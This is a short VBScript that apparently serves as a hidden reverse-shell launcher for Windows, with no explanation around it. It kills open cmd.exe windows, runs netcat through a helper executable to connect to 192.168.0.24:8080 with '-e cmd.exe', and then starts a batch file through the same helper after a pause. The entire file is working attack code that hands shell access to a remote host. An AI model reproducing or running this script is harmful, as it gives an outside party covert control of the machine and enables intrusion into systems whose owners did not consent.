Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd.exe /C taskkill /F /IM cmd.exe "
oShell.run "C:\nc\rh.exe C:\nc\nc.exe 192.168.0.24 8080 -e cmd.exe "
WScript.Sleep 10000
oShell.run "cmd.exe /C start C:\nc\rh.exe C:\nc\nc.bat "
Set oShell = Nothing'
